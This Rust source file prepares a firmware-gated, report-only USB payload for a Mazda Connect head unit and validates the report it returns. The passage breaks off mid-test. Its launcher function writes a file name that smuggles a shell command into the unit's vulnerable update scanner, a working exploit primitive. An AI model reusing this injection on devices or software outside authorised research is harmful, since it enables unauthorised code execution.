//! Prepare a firmware-gated, report-only USB payload for a Mazda Connect CMU.
//!
//! The Mac-side preparer writes only to an existing, otherwise empty destination directory. The
//! CMU-side payload is a fixed POSIX shell script embedded in this crate; it has no arbitrary path,
//! command, persistence, remount, reboot, VIP, CAN, or LIN options.

use std::ffi::OsStr;
use std::fmt;
use std::fs::{self, OpenOptions};
use std::io::{self, Read, Write};
use std::path::{Path, PathBuf};

#[cfg(target_os = "macos")]
use std::path::Component;
#[cfg(target_os = "macos")]
use std::process::Command;

/// The only firmware family on which the USB launcher is currently allowed to run.
pub const SUPPORTED_FIRMWARE: &str = "74.00.324A";

/// A single, explicitly selected stock removable-media mount.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CmuMount {
    Sda1,
    Sdb1,
}

impl CmuMount {
    #[must_use]
    pub const fn as_str(self) -> &'static str {
        match self {
            Self::Sda1 => "sda1",
            Self::Sdb1 => "sdb1",
        }
    }
}

impl std::str::FromStr for CmuMount {
    type Err = ();

    fn from_str(value: &str) -> Result<Self, Self::Err> {
        match value {
            "sda1" => Ok(Self::Sda1),
            "sdb1" => Ok(Self::Sdb1),
            _ => Err(()),
        }
    }
}

const COLLECTOR_FILE_NAME: &str = "cmu-inspect.sh";
const UPDATE_FLAG_FILE_NAME: &str = "jci-autoupdate";
const COLLECTOR: &[u8] = include_bytes!("../assets/cmu-inspect.sh");
const MAX_REPORT_FILE_BYTES: u64 = 1024 * 1024;
const MAX_CAPTURE_BYTES: u64 = 256 * 1024;
const REPORT_BUILD_ID: &str = "mazda-cmu-inspect-report-v2";

#[derive(Debug, Clone, Copy)]
struct ObservationSpec {
    source: &'static str,
    file: &'static str,
}

const OBSERVATIONS: [ObservationSpec; 20] = [
    ObservationSpec {
        source: "jci/version.ini",
        file: "firmware-version.ini",
    },
    ObservationSpec {
        source: "proc/sys/kernel/osrelease",
        file: "kernel-release.txt",
    },
    ObservationSpec {
        source: "proc/version",
        file: "kernel-version.txt",
    },
    ObservationSpec {
        source: "proc/cmdline",
        file: "kernel-command-line.txt",
    },
    ObservationSpec {
        source: "proc/cpuinfo",
        file: "cpuinfo.txt",
    },
    ObservationSpec {
        source: "proc/meminfo",
        file: "meminfo.txt",
    },
    ObservationSpec {
        source: "proc/mounts",
        file: "mounts.txt",
    },
    ObservationSpec {
        source: "proc/modules",
        file: "modules.txt",
    },
    ObservationSpec {
        source: "proc/config.gz",
        file: "kernel-config.gz",
    },
    ObservationSpec {
        source: "proc/partitions",
        file: "partitions.txt",
    },
    ObservationSpec {
        source: "proc/mtd",
        file: "mtd.txt",
    },
    ObservationSpec {
        source: "proc/bus/input/devices",
        file: "input-devices.txt",
    },
    ObservationSpec {
        source: "proc/net/dev",
        file: "network-devices.txt",
    },
    ObservationSpec {
        source: "proc/net/route",
        file: "network-routes.txt",
    },
    ObservationSpec {
        source: "proc/net/arp",
        file: "network-arp.txt",
    },
    ObservationSpec {
        source: "proc/bus/usb/devices",
        file: "usb-devices.txt",
    },
    ObservationSpec {
        source: "sys/class/graphics/fb0/name",
        file: "framebuffer-name.txt",
    },
    ObservationSpec {
        source: "sys/class/graphics/fb0/modes",
        file: "framebuffer-modes.txt",
    },
    ObservationSpec {
        source: "sys/class/drm/card0/device/uevent",
        file: "drm-device.txt",
    },
    ObservationSpec {
        source: "module-files/usb-network",
        file: "usb-network-modules.txt",
    },
];

/// An error encountered before or while preparing removable media.
#[derive(Debug)]
pub enum PrepareError {
    UnsupportedFirmware,
    DestinationNotFound,
    DestinationIsSymlink,
    DestinationNotDirectory,
    DestinationTooBroad,
    DestinationOutsideMacVolumes,
    DestinationNotFat32,
    DestinationNotRemovable,
    DestinationNotMbr,
    DestinationNotEmpty(String),
    UnexpectedPostWriteEntry(String),
    PreparedPayloadMismatch(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for PrepareError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedFirmware => write!(
                formatter,
                "firmware must be explicitly confirmed as {SUPPORTED_FIRMWARE}"
            ),
            Self::DestinationNotFound => write!(formatter, "destination does not exist"),
            Self::DestinationIsSymlink => {
                write!(formatter, "destination must not be a symbolic link")
            }
            Self::DestinationNotDirectory => write!(formatter, "destination is not a directory"),
            Self::DestinationTooBroad => {
                write!(formatter, "refusing a filesystem root destination")
            }
            Self::DestinationOutsideMacVolumes => write!(
                formatter,
                "on macOS, destination must be a mounted volume root under /Volumes"
            ),
            Self::DestinationNotFat32 => {
                write!(formatter, "destination volume is not FAT32 (msdos)")
            }
            Self::DestinationNotRemovable => {
                write!(formatter, "destination volume is not removable media")
            }
            Self::DestinationNotMbr => {
                write!(formatter, "destination disk does not use an MBR partition map")
            }
            Self::DestinationNotEmpty(name) => write!(
                formatter,
                "destination contains non-macOS-metadata entry {name:?}; use a blank FAT32 drive"
            ),
            Self::UnexpectedPostWriteEntry(name) => write!(
                formatter,
                "unexpected entry {name:?} appeared while preparing the drive; payload was rolled back"
            ),
            Self::PreparedPayloadMismatch(name) => write!(
                formatter,
                "prepared payload file {name:?} did not match the intended bytes; payload was rolled back"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for PrepareError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Evidence from a completed phase-one report that is relevant to a later USB-Ethernet probe.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ReportAnalysis {
    pub firmware: String,
    pub available_usb_network_drivers: Vec<UsbNetworkDriver>,
    pub loaded_usb_network_modules: Vec<String>,
    pub observed_interfaces: Vec<String>,
}

/// USB-network driver families relevant to a host-safe Mac transport.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum UsbNetworkDriver {
    Asix,
    CdcEther,
    CdcNcm,
}

impl ReportAnalysis {
    /// Whether the exact running-kernel report contains USB-network compatibility evidence.
    ///
    /// This does not authorize inserting an adapter, loading a module, or configuring an
    /// interface. USB insertion itself may trigger hotplug, module loading, configuration, and
    /// stock logging.
    #[must_use]
    pub const fn has_usb_network_compatibility_evidence(&self) -> bool {
        !self.available_usb_network_drivers.is_empty()
    }
}

/// An error encountered while validating a report copied back to the Mac.
#[derive(Debug)]
pub enum AnalyzeError {
    ReportNotFound,
    ReportNotDirectory,
    MissingFile(&'static str),
    OversizedFile(&'static str),
    InvalidFileType(&'static str),
    UnexpectedFile(String),
    InvalidSchema,
    InvalidObservation(&'static str),
    ObservationFailed {
        source: &'static str,
        status: &'static str,
    },
    ChecksumMismatch(&'static str),
    IncompleteReport,
    UnsupportedFirmware(String),
    Io {
        action: &'static str,
        path: PathBuf,
        source: io::Error,
    },
}

impl fmt::Display for AnalyzeError {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReportNotFound => write!(formatter, "report directory does not exist"),
            Self::ReportNotDirectory => write!(formatter, "report path is not a directory"),
            Self::MissingFile(name) => write!(formatter, "report is missing {name}"),
            Self::OversizedFile(name) => write!(formatter, "report file {name} exceeds 1 MiB"),
            Self::InvalidFileType(name) => {
                write!(formatter, "report file {name} is not a regular file")
            }
            Self::UnexpectedFile(name) => {
                write!(formatter, "report contains unexpected file {name:?}")
            }
            Self::InvalidSchema => write!(formatter, "report manifest schema is not supported"),
            Self::InvalidObservation(source) => {
                write!(formatter, "manifest record for {source} is invalid")
            }
            Self::ObservationFailed { source, status } => {
                write!(formatter, "CMU observation {source} failed with {status}")
            }
            Self::ChecksumMismatch(name) => {
                write!(
                    formatter,
                    "report file {name} does not match its manifest checksum"
                )
            }
            Self::IncompleteReport => {
                write!(formatter, "report is missing its flushed completion marker")
            }
            Self::UnsupportedFirmware(firmware) => write!(
                formatter,
                "report is from unsupported firmware {firmware:?}, expected {SUPPORTED_FIRMWARE}"
            ),
            Self::Io {
                action,
                path,
                source,
            } => write!(formatter, "could not {action} {}: {source}", path.display()),
        }
    }
}

impl std::error::Error for AnalyzeError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            Self::Io { source, .. } => Some(source),
            _ => None,
        }
    }
}

/// Writes the three-file report payload into an existing blank removable-media directory.
///
/// `confirmed_firmware` must exactly match [`SUPPORTED_FIRMWARE`]. Existing files are never
/// overwritten, and a partial preparation is rolled back if a later file cannot be created.
///
/// # Errors
///
/// Returns an error when the firmware was not explicitly confirmed, the destination is unsafe or
/// non-empty, or any payload file cannot be created and flushed.
pub fn prepare_usb(
    destination: &Path,
    confirmed_firmware: &str,
    cmu_mount: CmuMount,
) -> Result<(), PrepareError> {
    if confirmed_firmware != SUPPORTED_FIRMWARE {
        return Err(PrepareError::UnsupportedFirmware);
    }

    let metadata = fs::symlink_metadata(destination).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            PrepareError::DestinationNotFound
        } else {
            io_error("inspect", destination, error)
        }
    })?;
    if metadata.file_type().is_symlink() {
        return Err(PrepareError::DestinationIsSymlink);
    }
    if !metadata.is_dir() {
        return Err(PrepareError::DestinationNotDirectory);
    }
    if destination.parent().is_none() {
        return Err(PrepareError::DestinationTooBroad);
    }

    #[cfg(target_os = "macos")]
    verify_macos_volume(destination)?;

    let entries =
        fs::read_dir(destination).map_err(|error| io_error("list", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("list", destination, error))?;
        if !is_ignorable_macos_metadata(&entry.file_name()) {
            return Err(PrepareError::DestinationNotEmpty(
                entry.file_name().to_string_lossy().into_owned(),
            ));
        }
    }

    let launcher_file_name = launcher_file_name(cmu_mount);
    let payloads: [(&str, &[u8]); 3] = [
        (COLLECTOR_FILE_NAME, COLLECTOR),
        (UPDATE_FLAG_FILE_NAME, b"\n"),
        (&launcher_file_name, b"\n"),
    ];
    let mut created = Vec::with_capacity(payloads.len());

    for &(name, content) in &payloads {
        let path = destination.join(name);
        if let Err(error) = create_new_file(&path, content) {
            let _ = fs::remove_file(&path);
            rollback_created_files(&created);
            return Err(io_error("create payload file", &path, error));
        }
        created.push(path);
    }

    if let Err(error) = verify_prepared_entries(destination, &payloads) {
        rollback_created_files(&created);
        return Err(error);
    }

    Ok(())
}

fn verify_prepared_entries(
    destination: &Path,
    payloads: &[(&str, &[u8])],
) -> Result<(), PrepareError> {
    let entries = fs::read_dir(destination)
        .map_err(|error| io_error("verify prepared drive", destination, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| io_error("verify prepared drive", destination, error))?;
        let name = entry.file_name();
        let is_payload = payloads
            .iter()
            .any(|(payload_name, _)| name == OsStr::new(payload_name));
        if !is_payload && !is_ignorable_macos_metadata(&name) {
            return Err(PrepareError::UnexpectedPostWriteEntry(
                name.to_string_lossy().into_owned(),
            ));
        }
    }
    for &(name, expected) in payloads {
        verify_payload_file(destination, name, expected)?;
    }
    Ok(())
}

fn verify_payload_file(
    destination: &Path,
    name: &str,
    expected: &[u8],
) -> Result<(), PrepareError> {
    let path = destination.join(name);
    let metadata = fs::symlink_metadata(&path)
        .map_err(|error| io_error("verify payload file", &path, error))?;
    if metadata.file_type().is_symlink()
        || !metadata.is_file()
        || metadata.len() != u64::try_from(expected.len()).expect("payload length fits in u64")
    {
        return Err(PrepareError::PreparedPayloadMismatch(name.to_owned()));
    }
    let mut actual = Vec::with_capacity(expected.len() + 1);
    fs::File::open(&path)
        .map_err(|error| io_error("open payload for verification", &path, error))?
        .take(u64::try_from(expected.len()).expect("payload length fits in u64") + 1)
        .read_to_end(&mut actual)
        .map_err(|error| io_error("read payload for verification", &path, error))?;
    if actual != expected {
        return Err(PrepareError::PreparedPayloadMismatch(name.to_owned()));
    }
    Ok(())
}

/// Builds the one command-injection filename used by the vulnerable Gen-6.5 update scanner.
///
/// This implementation is independently derived from ZDI's published filename-injection
/// primitive. FAT disallows a literal `/`, so standard shell built-ins derive `/` by moving from
/// `HOME` to its parent. Unlike community launchers, this names exactly one caller-selected mount
/// and contains no mount-search loop or arbitrary command input.
#[must_use]
pub fn launcher_file_name(cmu_mount: CmuMount) -> String {
    format!(
        "$(R=$(cd ${{HOME}};cd ..;pwd);sh ${{R}}tmp${{R}}mnt${{R}}{}${{R}}cmu-inspect.sh).up",
        cmu_mount.as_str()
    )
}

/// Validates and analyzes a completed `mazda-cmu-report` directory.
///
/// The analyzer is read-only and caps every report file at 1 MiB before reading it. A positive
/// transport result is compatibility evidence only, not permission to insert hardware or alter
/// CMU networking.
///
/// # Errors
///
/// Returns an error when the report is missing, malformed, incomplete, oversized, unreadable, or
/// from any firmware other than [`SUPPORTED_FIRMWARE`].
pub fn analyze_report(report_directory: &Path) -> Result<ReportAnalysis, AnalyzeError> {
    let metadata = fs::metadata(report_directory).map_err(|error| {
        if error.kind() == io::ErrorKind::NotFound {
            AnalyzeError::ReportNotFound
        } else {
            analyze_io_error("inspect", report_directory, error)
        }
    })?;
    if !metadata.is_dir() {
        return Err(AnalyzeError::ReportNotDirectory);
    }

    let manifest_bytes = read_required_report_bytes(report_directory, "manifest.tsv")?;
    let manifest = std::str::from_utf8(&manifest_bytes).map_err(|_| AnalyzeError::InvalidSchema)?;
    let mut manifest_lines = manifest.lines();
    let expected_build_line = format!("build\t{REPORT_BUILD_ID}");
    if manifest_lines.next() != Some("mazda-cmu-report\t2")
        || manifest_lines.next() != Some(expected_build_line.as_str())
        || manifest_lines.next() != Some("source\tstatus\tbytes\tcksum\tfile")
    {
        return Err(AnalyzeError::InvalidSchema);
    }

    let mut observations = Vec::with_capacity(OBSERVATIONS.len());
    for spec in OBSERVATIONS {
        let line = manifest_lines
            .next()
            .ok_or(AnalyzeError::InvalidObservation(spec.source))?;
        observations.push(validate_observation(report_directory, spec, line)?);
    }
    if manifest_lines.next() != Some("result\tcomplete") || manifest_lines.next().is_some() {
        return Err(AnalyzeError::InvalidSchema);
    }

    let sync_marker_path = report_directory.join("sync-complete");
    if !sync_marker_path.exists() {
        return Err(AnalyzeError::IncompleteReport);
    }
    let sync_marker = read_report_file(&sync_marker_path, "sync-complete")?;
    if sync_marker != format!("{REPORT_BUILD_ID}\n").as_bytes() {
        return Err(AnalyzeError::IncompleteReport);
    }

    validate_report_entries(report_directory, &observations)?;

    let firmware_file = observation_text(&observations, 0)?;
    let firmware = parse_firmware(firmware_file).ok_or(AnalyzeError::InvalidSchema)?;
    if firmware != SUPPORTED_FIRMWARE {
        return Err(AnalyzeError::UnsupportedFirmware(firmware));
    }

    let kernel_release = observation_text(&observations, 1)?.trim();
    if kernel_release.is_empty()
        || !kernel_release
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "._+-".contains(character))
    {
        return Err(AnalyzeError::InvalidObservation(
            "proc/sys/kernel/osrelease",
        ));
    }
    let module_files = observation_text_or_empty(&observations, 19);
    validate_module_file_list(module_files, kernel_release)?;
    let loaded_modules = observation_text_or_empty(&observations, 7);
    let network_devices = observation_text_or_empty(&observations, 12);

    let mut available_usb_network_drivers = Vec::new();
    for (module, driver) in [
        ("asix", UsbNetworkDriver::Asix),
        ("cdc_ether", UsbNetworkDriver::CdcEther),
        ("cdc_ncm", UsbNetworkDriver::CdcNcm),
    ] {
        if module_is_available(module_files, loaded_modules, module) {
            available_usb_network_drivers.push(driver);
        }
    }

    Ok(ReportAnalysis {
        firmware,
        available_usb_network_drivers,
        loaded_usb_network_modules: parse_loaded_usb_network_modules(loaded_modules),
        observed_interfaces: parse_interfaces(network_devices),
    })
}

fn create_new_file(path: &Path, content: &[u8]) -> io::Result<()> {
    let mut file = OpenOptions::new().write(true).create_new(true).open(path)?;
    file.write_all(content)?;
    file.sync_all()
}

fn rollback_created_files(created: &[PathBuf]) {
    for path in created.iter().rev() {
        let _ = fs::remove_file(path);
    }
}

fn is_ignorable_macos_metadata(name: &OsStr) -> bool {
    matches!(
        name.to_str(),
        Some(".fseventsd" | ".Spotlight-V100" | ".Trashes")
    )
}

fn io_error(action: &'static str, path: &Path, source: io::Error) -> PrepareError {
    PrepareError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

fn analyze_io_error(action: &'static str, path: &Path, source: io::Error) -> AnalyzeError {
    AnalyzeError::Io {
        action,
        path: path.to_owned(),
        source,
    }
}

#[derive(Debug)]
struct Observation {
    spec: ObservationSpec,
    content: Option<Vec<u8>>,
}

fn validate_observation(
    report_directory: &Path,
    spec: ObservationSpec,
    manifest_line: &str,
) -> Result<Observation, AnalyzeError> {
    let fields = manifest_line.split('\t').collect::<Vec<_>>();
    if fields.len() != 5 || fields[0] != spec.source {
        return Err(AnalyzeError::InvalidObservation(spec.source));
    }

    let status = fields[1];
    let bytes = fields[2]
        .parse::<u64>()
        .map_err(|_| AnalyzeError::InvalidObservation(spec.source))?;
    if matches!(status, "timeout" | "io_error") {
        if bytes == 0 && fields[3] == "-" && fields[4] == "-" {
            return Err(AnalyzeError::ObservationFailed {
                source: spec.source,
                status: if status == "timeout" {
                    "timeout"
                } else {
                    "io_error"
                },
            });
        }
        return Err(AnalyzeError::InvalidObservation(spec.source));
    }
    if matches!(status, "ok" | "truncated") {
        if fields[4] != spec.file
            || bytes > MAX_CAPTURE_BYTES
            || (status == "truncated" && bytes != MAX_CAPTURE_BYTES)
        {
            return Err(AnalyzeError::InvalidObservation(spec.source));
        }
        let expected_checksum = fields[3]
            .parse::<u32>()
            .map_err(|_| AnalyzeError::InvalidObservation(spec.source))?;
        let content = read_required_report_bytes(report_directory, spec.file)?;
        if u64::try_from(content.len()).expect("capture length fits in u64") != bytes
            || posix_cksum(&content) != expected_checksum
        {
            return Err(AnalyzeError::ChecksumMismatch(spec.file));
        }
        Ok(Observation {
            spec,
            content: Some(content),
        })
    } else if matches!(
        status,
        "not_found" | "not_regular_file" | "permission_denied" | "dependency_failed"
    ) && bytes == 0
        && fields[3] == "-"
        && fields[4] == "-"
    {
        Ok(Observation {
            spec,
            content: None,
        })
    } else {
        Err(AnalyzeError::InvalidObservation(spec.source))
    }
}

fn validate_report_entries(
    report_directory: &Path,
    observations: &[Observation],
) -> Result<(), AnalyzeError> {
    let entries = fs::read_dir(report_directory)
        .map_err(|error| analyze_io_error("list", report_directory, error))?;
    for entry in entries {
        let entry = entry.map_err(|error| analyze_io_error("list", report_directory, error))?;
        let name = entry.file_name();
        let allowed = matches!(name.to_str(), Some("manifest.tsv" | "sync-complete"))
            || observations.iter().any(|observation| {
                observation.content.is_some() && name == OsStr::new(observation.spec.file)
            });
        if !allowed {
            return Err(AnalyzeError::UnexpectedFile(
                name.to_string_lossy().into_owned(),
            ));
        }
    }
    Ok(())
}

fn observation_text(observations: &[Observation], index: usize) -> Result<&str, AnalyzeError> {
    let observation = observations.get(index).ok_or(AnalyzeError::InvalidSchema)?;
    let content = observation
        .content
        .as_deref()
        .ok_or(AnalyzeError::InvalidObservation(observation.spec.source))?;
    std::str::from_utf8(content)
        .map_err(|_| AnalyzeError::InvalidObservation(observation.spec.source))
}

fn observation_text_or_empty(observations: &[Observation], index: usize) -> &str {
    observations
        .get(index)
        .and_then(|observation| observation.content.as_deref())
        .and_then(|content| std::str::from_utf8(content).ok())
        .unwrap_or_default()
}

fn read_required_report_bytes(
    report_directory: &Path,
    name: &'static str,
) -> Result<Vec<u8>, AnalyzeError> {
    let path = report_directory.join(name);
    if !path.exists() {
        return Err(AnalyzeError::MissingFile(name));
    }
    read_report_file(&path, name)
}

fn read_report_file(path: &Path, name: &'static str) -> Result<Vec<u8>, AnalyzeError> {
    let metadata =
        fs::symlink_metadata(path).map_err(|error| analyze_io_error("inspect", path, error))?;
    if !metadata.is_file() || metadata.file_type().is_symlink() {
        return Err(AnalyzeError::InvalidFileType(name));
    }
    if metadata.len() > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    let file = fs::File::open(path).map_err(|error| analyze_io_error("open", path, error))?;
    let mut bytes = Vec::new();
    file.take(MAX_REPORT_FILE_BYTES + 1)
        .read_to_end(&mut bytes)
        .map_err(|error| analyze_io_error("read", path, error))?;
    if u64::try_from(bytes.len()).expect("report byte count fits in u64") > MAX_REPORT_FILE_BYTES {
        return Err(AnalyzeError::OversizedFile(name));
    }

    Ok(bytes)
}

fn parse_firmware(version_file: &str) -> Option<String> {
    let base = version_file
        .lines()
        .find_map(|line| line.strip_prefix("JCI_SW_VER="))?
        .trim_end_matches('\r')
        .trim_matches('"');
    let base = base.rsplit('_').next()?;
    let patch = version_file
        .lines()
        .find_map(|line| line.strip_prefix("JCI_SW_VER_PATCH="))
        .map(str::trim)
        .map(|value| value.trim_end_matches('\r').trim_matches('"'))
        .unwrap_or_default()
        .to_ascii_uppercase();

    if base == "74.00.324A" && matches!(patch.as_str(), "" | "A") {
        Some(SUPPORTED_FIRMWARE.to_owned())
    } else {
        Some(format!("{base}{patch}"))
    }
}

fn validate_module_file_list(module_files: &str, kernel_release: &str) -> Result<(), AnalyzeError> {
    let prefix = format!("lib/modules/{kernel_release}/kernel/drivers/net/usb/");
    for line in module_files.lines() {
        let file_name = line
            .strip_prefix(&prefix)
            .ok_or(AnalyzeError::InvalidObservation("module-files/usb-network"))?;
        if file_name.is_empty()
            || file_name.contains('/')
            || !file_name
                .chars()
                .all(|character| character.is_ascii_alphanumeric() || "._+-".contains(character))
            || !matches!(file_name.rsplit_once(".ko"), Some((_, "" | ".gz" | ".xz")))
        {
            return Err(AnalyzeError::InvalidObservation("module-files/usb-network"));
        }
    }
    Ok(())
}

fn module_is_available(module_files: &str, loaded_modules: &str, module: &str) -> bool {
    loaded_modules
        .lines()
        .any(|line| line.split_whitespace().next() == Some(module))
        || module_files.lines().any(|line| {
            let file_name = line.rsplit('/').next().unwrap_or(line);
            [
                format!("{module}.ko"),
                format!("{module}.ko.gz"),
                format!("{module}.ko.xz"),
            ]
            .iter()
            .any(|candidate| file_name == candidate)
        })
}

fn parse_interfaces(network_devices: &str) -> Vec<String> {
    let mut interfaces = network_devices
        .lines()
        .filter_map(|line| line.split_once(':').map(|(name, _)| name.trim()))
        .filter(|name| {
            !name.is_empty()
                && name
                    .chars()
                    .all(|character| character.is_ascii_alphanumeric() || "_.-".contains(character))
        })
        .map(str::to_owned)
        .collect::<Vec<_>>();
    interfaces.sort_unstable();
    interfaces.dedup();
    interfaces
}

fn parse_loaded_usb_network_modules(loaded_modules: &str) -> Vec<String> {
    let mut modules = loaded_modules
        .lines()
        .filter_map(|line| line.split_whitespace().next())
        .filter(|module| matches!(*module, "usbnet" | "asix" | "cdc_ether" | "cdc_ncm"))
        .map(str::to_owned)
        .collect::<Vec<_>>();
    modules.sort_unstable();
    modules.dedup();
    modules
}

fn posix_cksum(bytes: &[u8]) -> u32 {
    let mut checksum = 0_u32;
    for &byte in bytes {
        checksum = cksum_update(checksum, byte);
    }
    let mut length = u64::try_from(bytes.len()).expect("slice length fits in u64");
    while length != 0 {
        let byte = u8::try_from(length & 0xff).expect("masked length byte fits in u8");
        checksum = cksum_update(checksum, byte);
        length >>= 8;
    }
    !checksum
}

fn cksum_update(checksum: u32, byte: u8) -> u32 {
    let index = ((checksum >> 24) ^ u32::from(byte)) & 0xff;
    let mut polynomial = index << 24;
    for _ in 0..8 {
        polynomial = if polynomial & 0x8000_0000 == 0 {
            polynomial << 1
        } else {
            (polynomial << 1) ^ 0x04c1_1db7
        };
    }
    (checksum << 8) ^ polynomial
}

#[cfg(target_os = "macos")]
fn verify_macos_volume(destination: &Path) -> Result<(), PrepareError> {
    let mut components = destination.components();
    let is_volume_root = matches!(components.next(), Some(Component::RootDir))
        && matches!(components.next(), Some(Component::Normal(name)) if name == "Volumes")
        && matches!(components.next(), Some(Component::Normal(_)))
        && components.next().is_none();
    if !is_volume_root {
        return Err(PrepareError::DestinationOutsideMacVolumes);
    }

    let output = Command::new("/usr/sbin/diskutil")
        .args(["info", "-plist"])
        .arg(destination)
        .output()
        .map_err(|error| io_error("inspect volume with diskutil", destination, error))?;
    if !output.status.success() {
        return Err(io_error(
            "inspect volume with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    let volume_plist = String::from_utf8_lossy(&output.stdout);
    let parent_disk = plist_string_value(&volume_plist, "ParentWholeDisk")
        .ok_or(PrepareError::DestinationNotMbr)?;

    let disk_output = Command::new("/usr/sbin/diskutil")
        .args(["list", "-plist", parent_disk])
        .output()
        .map_err(|error| io_error("inspect partition map with diskutil", destination, error))?;
    if !disk_output.status.success() {
        return Err(io_error(
            "inspect partition map with diskutil",
            destination,
            io::Error::other("diskutil returned a failure status"),
        ));
    }

    validate_macos_volume_plists(&volume_plist, &String::from_utf8_lossy(&disk_output.stdout))
}

#[cfg(any(target_os = "macos", test))]
fn plist_value_starts_with(plist: &str, key: &str, expected_value: &str) -> bool {
    let marker = format!("<key>{key}</key>");
    plist
        .split_once(&marker)
        .is_some_and(|(_, remainder)| remainder.trim_start().starts_with(expected_value))
}

#[cfg(any(target_os = "macos", test))]
fn plist_string_value<'a>(plist: &'a str, key: &str) -> Option<&'a str> {
    let marker = format!("<key>{key}</key>");
    let (_, remainder) = plist.split_once(&marker)?;
    let remainder = remainder.trim_start().strip_prefix("<string>")?;
    remainder.split_once("</string>").map(|(value, _)| value)
}

#[cfg(any(target_os = "macos", test))]
fn validate_macos_volume_plists(
    volume_plist: &str,
    whole_disk_plist: &str,
) -> Result<(), PrepareError> {
    let filesystem_type = plist_string_value(volume_plist, "FilesystemType");
    let filesystem_name = plist_string_value(volume_plist, "FilesystemName");
    if filesystem_type != Some("msdos")
        || !filesystem_name.is_some_and(|name| name.to_ascii_uppercase().contains("FAT32"))
    {
        return Err(PrepareError::DestinationNotFat32);
    }
    if !plist_value_starts_with(volume_plist, "RemovableMedia", "<true/>") {
        return Err(PrepareError::DestinationNotRemovable);
    }
    if plist_string_value(whole_disk_plist, "Content") != Some("FDisk_partition_scheme") {
        return Err(PrepareError::DestinationNotMbr);
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    #[cfg(target_os = "linux")]
    use std::process::Command;
    use std::time::{SystemTime, UNIX_EPOCH};

    use super::*;

    struct TestDirectory(PathBuf);

    impl TestDirectory {
        fn new(label: &str) -> Self {
            let unique = SystemTime::now()
                .duration_since(UNIX_EPOCH)
                .expect("clock is after Unix epoch")
                .as_nanos();
            let path = std::env::temp_dir().join(format!(
                "mazda-cmu-inspect-{label}-{}-{unique}",
                std::process::id()
            ));
            fs::create_dir_all(&path).expect("create test directory");
            Self(path)
        }

        fn write(&self, relative: &str, content: &[u8]) {
            let path = self.0.join(relative);
            fs::create_dir_all(path.parent().expect("fixture has a parent"))
                .expect("create fixture parent");
            fs::write(path, content).expect("write fixture");
        }
    }

    impl Drop for TestDirectory {
        fn drop(&mut self) {
            fs::remove_dir_all(&self.0).expect("remove test directory");
        }
    }

    #[test]
    fn prepares_exact_payload_without_overwriting() {
        let usb = TestDirectory::new("prepare");

        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");

        assert_eq!(
            fs::read(usb.0.join(COLLECTOR_FILE_NAME)).expect("read collector"),
            COLLECTOR
        );
        assert_eq!(
            fs::read(usb.0.join(UPDATE_FLAG_FILE_NAME)).expect("read flag"),
            b"\n"
        );
        let launcher = launcher_file_name(CmuMount::Sda1);
        assert!(usb.0.join(&launcher).is_file());
        assert!(matches!(
            prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1),
            Err(PrepareError::DestinationNotEmpty(_))
        ));
    }

    #[test]
    fn prepared_entry_verification_reads_back_exact_payload_bytes() {
        let usb = TestDirectory::new("prepare-readback");
        prepare_usb(&usb.0, SUPPORTED_FIRMWARE, CmuMount::Sda1).expect("prepare payload");
        let launcher = launcher_file_name(CmuMount::Sda1);
        let payloads: [(&str, &[u8]); 3] = [
            (COLLECTOR_FILE_NAME, COLLECTOR),
            (UPDATE_FLAG_FILE_NAME, b"\n"),
            (&launcher, b"\n"),
        ];

        fs::write(usb.0.join(UPDATE_FLAG_FILE_NAME), b"changed").expect("corrupt prepared flag");
        assert!(matches!(
            verify_prepared_entries(&usb.0, &payloads),
            Err(PrepareError::PreparedPayloadMismatch(name)) if name == UPDATE_FLAG_FILE_NAME
        ));

        fs::write(usb.0.join(UPDATE_FLAG_FILE_NAME), b"\n").expect("restore prepared flag");
        fs::remove_file(usb.0.join(COLLECTOR_FILE_NAME)).expect("remove prepared collector");
        assert!(verify_prepared_entries(&usb.0, &payloads).is_err());
    }

    #[test]
    fn launcher_name_is_a_single_valid_fat_component() {
        let launcher = launcher_file_name(CmuMount::Sdb1);
        assert!(launcher.len() <= 255);
        assert!(!launcher.chars().any(|character| matches!(
            character,
            '<' | '>' | ':' | '"' | '/' | '\\' | '|' | '?' | '*'
        )));
        assert!(Path::new(&launcher)
            .extension()
            .is_some_and(|extension| extension.eq_ignore_ascii_case("up")));
        assert!(launcher.contains("sdb1"));
        assert!(launcher.contains("cmu-inspect.sh"));
        assert!(!launcher.contains("for "));
        assert!(!launcher.contains("HOME%root"));
    }

    #[test]
    fn diskutil_plists_require_fat32_removable_media_and_mbr() {
        let volume = r"
            <plist><dict>
            <key>FilesystemType</key><string>msdos</string>
            <key>FilesystemName</key><string>MS-DOS FAT32</string>
            <key>ParentWholeDisk</key><string>disk7</string>
            <key>RemovableMedia</key><true/>
            </dict></plist>
        ";
        let mbr = r"
            <plist><dict><key>AllDisksAndPartitions</key><array><dict>
            <key>Content</key><string>FDisk_partition_scheme</string>
            </dict></array></dict></plist>
        ";
        assert!(validate_macos_volume_plists(volume, mbr).is_ok());

        let fat16 = volume.replace("FAT32", "FAT16");
        assert!(matches!(
